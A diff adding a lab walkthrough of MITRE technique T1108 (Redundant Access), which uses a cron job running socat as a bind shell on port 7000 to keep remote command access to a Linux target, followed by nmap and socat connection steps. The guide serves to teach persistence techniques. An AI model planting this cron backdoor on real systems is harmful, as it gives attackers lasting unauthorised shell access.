@@ -478,6 +478,55 @@ In this way with the help of id_rsa(ssh private key) we can create a persistence
 
 ===========================================completed========================================
 
+Technique 9: T1108: Redundant Access
+
+Redundant Access refers to various command and control protocols or credentialed access to remote services to maintain 
+access.
+
+Redundant access typically refers to having multiple means of accessing a system or resource that serve the same purpose. 
+In the context of security, redundant access can be considered a vulnerability because it increases the attack surface and 
+provides additional entry points for potential attackers.
+
+For example, imagine a system with SSH (Secure Shell) access enabled for administrative purposes. If an administrator 
+also sets up a separate backdoor using a different method, such as opening a TCP port and spawning a shell, 
+this would be redundant access. Both SSH and the backdoor provide a way for someone to gain unauthorized access 
+to the system. If the backdoor is discovered by an attacker, it could be exploited to compromise the system, 
+even if SSH access is properly secured.
+
+In this technique, attacker has target machine access so SSH into the target machine.
+
+Now check current processes running on target system.
+ps -eaf
+
+We come to know that cron service is running so add a new cron
+
+echo "* * * * * socat tcp-l:7000,fork system:/bin/bash" > cron
+
+Above line, when added to a crontab file, schedules the execution of the socat command every minute. 
+The socat command establishes a TCP listener on port 7000 and, when a connection is made, 
+forks a new process that executes /bin/bash, effectively allowing remote access to the system.
+
+Now delete a "wait" file and our SSH session terminated because as per lab if "wait" file deleted so user password 
+changes automatically.
+
+Since socat server was started on port 7000, perform nmap scan to check whether port
+7000 is open.
+
+nmap -p 7000 target_ip
+
+Connect to the socat server and execute system commands:
+
+socat - TCP:target_ip:7000
+
+Now we are successfully login to target system and able to execute commands on target machine.
+
+This is another way to create Persistence with the help of redundant access by using socat tool.
+
+======================================completed=====================================
+
+
+
+
 
 
 
